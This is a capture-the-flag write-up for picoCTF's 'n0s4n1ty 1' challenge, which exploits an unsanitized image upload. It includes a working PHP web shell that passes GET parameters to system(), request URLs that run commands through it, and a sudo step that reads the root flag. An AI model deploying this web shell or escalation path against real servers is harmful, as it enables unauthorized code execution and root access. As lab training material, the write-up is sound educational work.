# n0s4n1ty 1

## Challenge

The goal here is to figure out how to access the root directory by taking advantage of the fact that uploaded images to the website are not sanitized. Somehow, this can be used to gain access to the root directory, where the flag is.

## Step 1: Exploting Unsanitized File

Since the website given does not sanitize the file format that is being uploaded, we end up getting the following message when uploading a shell script:

```
The file test.sh has been uploaded Path: uploads/test.sh 
```

## Step 2: Investigating the Uploads Path

After the upload, we should see our uploaded shell script in clear when accessing the following link.
Note that 58092 is personalized based on the instances that are started on PicoCTF

```
http://standard-pizzas.picoctf.net:58092/uploads/test.sh
```

This means that we should also be able to upload code that accepts parameters, then running that code with ```sudo``` should lead to escalated privileges.

## Step 3: PHP Script

DISCLAMER: I am litte to zero experience in PHP, so I asked AI to generate a simple PHP script that can help with this problem.

Here is the following PHP script called ```test.php``` that we will use to perform a remote code execution on the server machine:

```php
<?php
if (isset($_GET['cmd']) && isset($_GET['f']) && isset($_GET['s'])) {
    system($_GET['cmd'] . ' ' . $_GET['f'] . ' ' . $_GET['s']);
}
elseif (isset($_GET['cmd']) && isset($_GET['f']) ) {
    system($_GET['cmd'] . ' ' . $_GET['f']);
}
elseif (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

The code does two things:
- First, it checks if ```cmd```, ```f```, and ```s``` are passed in as parameters, then uses the ```system()``` function in PHP to execute the constructed shell command (if applicable)
- If the last parameter is missing, the code executes a single shell command that takes 1 parameter from ```f```, then we can execute a shell with no parameters if we exclude both ```f``` and ```s```
- Note: [PHP Docs](https://www.php.net/manual/en/function.system.php) for ```system()```

## Step 4: Execution

To execute the PHP script, we can use the following link:

```
http://standard-pizzas.picoctf.net:55518/uploads/test.php?cmd=whoami
```

We can get a list of permissions for our user as such:

```
http://standard-pizzas.picoctf.net:55518/uploads/test.php?cmd=sudo&f=-l
```

Since we have higher permissions based on the previous output, we can then execute the following shell script, which should be called ```test.sh``` and uploaded as well. Note that we can do an intermediate ```ls``` to find out the names of any files in ```/root``` 

```sh
cd /root; cat flag.txt
```

Finally, we can get the flag via the following:

```
http://standard-pizzas.picoctf.net:55518/uploads/test.php?cmd=sudo&f=sh&s=test.sh
```
